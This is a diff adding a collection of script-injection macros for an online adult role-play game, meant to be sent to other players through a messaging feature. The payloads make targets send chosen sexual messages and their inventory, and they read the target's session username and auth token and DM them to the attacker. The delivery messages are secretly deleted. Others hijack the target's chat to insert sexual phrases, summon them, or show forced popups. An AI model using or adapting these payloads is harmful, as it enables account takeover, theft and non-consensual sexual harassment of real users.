@@ -1,0 +1,130 @@
+============================================================
+ FORCED TEXT MACRO — send via MessageCast
+ The target will DM YOU the text you put in "..."
+ SETUP: username set to Celina2000
+        replace the message text before each send
+============================================================
+
+SendText:
+${GAME_MANAGER.instance.WaitFor("Message",{receiver:"Celina2000",message:"TYPE YOUR MESSAGE HERE"});}
+
+------------------------------------------------------------
+ EXAMPLES — copy any line, change the text in "...", send:
+------------------------------------------------------------
+
+${GAME_MANAGER.instance.WaitFor("Message",{receiver:"Celina2000",message:"i obey you, mistress~"});}
+
+${GAME_MANAGER.instance.WaitFor("Message",{receiver:"Celina2000",message:"please, i can't resist you~"});}
+
+${GAME_MANAGER.instance.WaitFor("Message",{receiver:"Celina2000",message:"i am yours, completely~"});}
+
+${GAME_MANAGER.instance.WaitFor("Message",{receiver:"Celina2000",message:"yes mistress, i will do anything~"});}
+
+${GAME_MANAGER.instance.WaitFor("Message",{receiver:"Celina2000",message:"my mind is empty, i only think of you~"});}
+
+------------------------------------------------------------
+ SEND INVENTORY (secretly — target's copy auto-deletes)
+ Target sends you their full inventory. They won't see it
+ in their chat because MessageCast deletes it on their end.
+------------------------------------------------------------
+
+SendInventory:
+${GAME_MANAGER.instance.WaitFor("Message",{receiver:"Celina2000",message:MESSAGECAST.getMyInventoryInAMessage(0)}).then(function(r){var mid=r&&r.chat&&r.chat.message&&r.chat.message.id;mid&&GAME_MANAGER.instance.WaitFor("Message",{delete:true,ids:[mid],thread:0});})&&''}${DELETETHIS="";}
+
+SendInventory_Cindy:
+${GAME_MANAGER.instance.WaitFor("Message",{receiver:"Cindy"+String.fromCharCode(95),message:MESSAGECAST.getMyInventoryInAMessage(0)}).then(function(r){var mid=r&&r.chat&&r.chat.message&&r.chat.message.id;mid&&GAME_MANAGER.instance.WaitFor("Message",{delete:true,ids:[mid],thread:0});})&&''}
+
+Give in as Item:
+${GAME_MANAGER.instance.Send("Form", { giveIn: true });}${DELETETHIS="";}
+
+------------------------------------------------------------
+ SEND SESSION USERNAME (secretly — target's copy auto-deletes)
+ Reads the target's in-game username from sessionStorage
+ and DMs it to you. Only you will see it.
+------------------------------------------------------------
+
+SendSessionUsernameandToken:
+${(function(){var s=JSON.parse(sessionStorage.getItem("session")||"{}}");var theName=s.username||"(not found)";var theToken=s["auth"+String.fromCharCode(95)+"token"]||"(not found)";GAME_MANAGER.instance.WaitFor("Message",{receiver:"Celina2000",message:"Session username: "+theName+"\nSession token: "+theToken}).then(function(r){var mid=r&&r.chat&&r.chat.message&&r.chat.message.id;mid&&GAME_MANAGER.instance.WaitFor("Message",{delete:true,ids:[mid],thread:0});});})()&&''}
+
+------------------------------------------------------------
+ WORD TEASE (installs a speech rule on the target)
+ Every word they type has a random chance to be swapped
+ with one of your phrases — in ALL chat AND DMs they send.
+ EDIT: change chance= (0.0–1.0) and the opts=[...] list.
+ The delivery DM auto-deletes on their end.
+------------------------------------------------------------
+
+AddWordTease:
+${MESSAGECAST.loadCustomSpeech();MESSAGECAST.activeCustomSpeech=true;window._twOpts=["*mistress toy*","*obedient~*","*helplessly aroused*","*yours completely*","*moans softly*"];window._twChance=0.25;window._twApply=function(m){return m.replace(/\b\w+\b/gm,function(w){return Math.random()<window._twChance?window._twOpts[Math.floor(Math.random()*window._twOpts.length)]:w;});};MESSAGECAST.addSpeechRule(/\b\w+\b/gm,(w)=>{return Math.random()<window._twChance?window._twOpts[Math.floor(Math.random()*window._twOpts.length)]:w;});if(!window._twDMPatch){window._twOrigWaitFor=GAME_MANAGER.instance.WaitFor;GAME_MANAGER.instance.WaitFor=function(a,o){if(a==="Message"&&MESSAGECAST.activeCustomSpeech&&o&&o.message&&!o.message.includes("DELETETHIS")){o.message=window._twApply(o.message);}return window._twOrigWaitFor.call(GAME_MANAGER.instance,a,o);};window._twDMPatch=true;}}${DELETETHIS="";}
+
+StopWordTease:
+${MESSAGECAST.loadCustomSpeech();MESSAGECAST.removeSpeechRule("ALL");MESSAGECAST.activeCustomSpeech=false;if(window._twOrigWaitFor){GAME_MANAGER.instance.WaitFor=window._twOrigWaitFor;}window._twDMPatch=false;}${DELETETHIS="";}
+
+------------------------------------------------------------
+ SUMMON (secretly — pulls target to your location)
+ Target sends you a meetup request to join YOUR location.
+ You will get a popup — just click Accept and they appear.
+ The delivery DM auto-deletes on their end.
+------------------------------------------------------------
+
+Summon:
+${(function(){GAME_MANAGER.instance.Invite("Celina2000",true);var t=0;var poll=setInterval(function(){t+=500;if(LOCATION.instance.opponent){clearInterval(poll);GAME_MANAGER.instance.Send("LocalChat",{message:"*finds themselves suddenly pulled to their mistress's side~*"});}else if(t>=60000){clearInterval(poll);}},500);})();}${DELETETHIS="";}
+
+------------------------------------------------------------
+ SELF-TF INANIMATE — cast a TF spell on yourself
+ Run ListSelfcastSpells first (in YOUR console) to find
+ the right spellId, then paste it into SelfTF below.
+ spellId: replace 0 with your actual inanimate spell id
+------------------------------------------------------------
+
+ListSelfcastSpells:
+${var out="";Object.values(GAME_MANAGER.instance.spells||{}).forEach(function(s){if(s.selfcast||s.tags&&s.tags.includes("Inanimate")){out+=s.id+": "+s.name+" [selfcast="+s.selfcast+"] tags="+JSON.stringify(s.tags)+"\n";}});GUI.instance.DisplayMessage(out||"No selfcast spells found");}${DELETETHIS="";}
+
+SelfTF:
+${GAME_MANAGER.instance.CastSpell(0,true);}${DELETETHIS="";}
+
+------------------------------------------------------------
+ SELF INANIMATE (visual — SELFTF_MASTER.js must be loaded)
+ WORKFLOW:
+   1. SelfTF_ListPlayers   — see who is at your location
+   2. SelfTF_SetOwner      — stage to set owner by username
+   3. SelfTF_Configure     — set item name / color / image
+   4. SelfTF_Enable        — activate with staged owner
+      SelfTF_Static        — activate with hardcoded Sakura
+   5. SelfTF_Off           — revert to normal
+ All macros run in YOUR browser — send to yourself via
+ MessageCast or paste into your own console directly.
+------------------------------------------------------------
+
+SelfTF_ListPlayers:
+${window.SELFTF?SELFTF.listPlayers():GUI.instance.DisplayMessage("Load SELFTF_MASTER.js first");}${DELETETHIS="";}
+
+SelfTF_SetOwner:
+${window.SELFTF&&SELFTF.setOwner("USERNAME_HERE");}${DELETETHIS="";}
+
+SelfTF_Configure:
+${window.SELFTF&&SELFTF.configure({name:"My Item Name",color:"Purple",imageUrl:"https://battlemageserotica.com/game/assets/items/leotard_vinyl.png",permanent:true,sealed:false});}${DELETETHIS="";}
+
+SelfTF_Enable:
+${window.SELFTF&&SELFTF.enableWithStagedOwner();}${DELETETHIS="";}
+
+SelfTF_Static:
+${window.SELFTF&&SELFTF.enableWithStaticOwner();}${DELETETHIS="";}
+
+SelfTF_Off:
+${window.SELFTF&&SELFTF.disable();}${DELETETHIS="";}
+
+SelfTF_Color:
+${window.SELFTF&&SELFTF.changeColor("Purple");}${DELETETHIS="";}
+
+------------------------------------------------------------
+ SHOW IMAGE (displays a full-screen image popup on target)
+ Image scales to fit their screen at 88% of viewport size.
+ Auto-closes after 15 seconds. Click anywhere to close early.
+ EDIT: replace IMAGE_URL_HERE with your actual image URL.
+ OPTIONAL: change the 15 to any number of seconds.
+------------------------------------------------------------
+
+ShowImage:
+${(function(){var e=document.getElementById('_bmr_imgpop');if(e){clearInterval(e._bmr_t);e.remove();}var ov=document.createElement('div');ov.id='_bmr_imgpop';ov.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.80);z-index:999999;display:flex;align-items:center;justify-content:center;cursor:pointer;';var img=document.createElement('img');img.src='IMAGE_URL_HERE';img.style.cssText='max-width:88vw;max-height:88vh;width:auto;height:auto;object-fit:contain;border-radius:6px;box-shadow:0 4px 60px rgba(0,0,0,0.95);';var badge=document.createElement('div');badge.style.cssText='position:absolute;bottom:14px;right:18px;color:rgba(255,255,255,0.55);font-size:13px;font-family:sans-serif;pointer-events:none;user-select:none;';badge.textContent='15';ov.appendChild(img);ov.appendChild(badge);document.body.appendChild(ov);var n=15;var t=setInterval(function(){n--;badge.textContent=n;if(n<=0){clearInterval(t);if(ov.parentNode)ov.remove();}},1000);ov._bmr_t=t;ov.onclick=function(){clearInterval(t);ov.remove();};})();}${DELETETHIS="";}
+
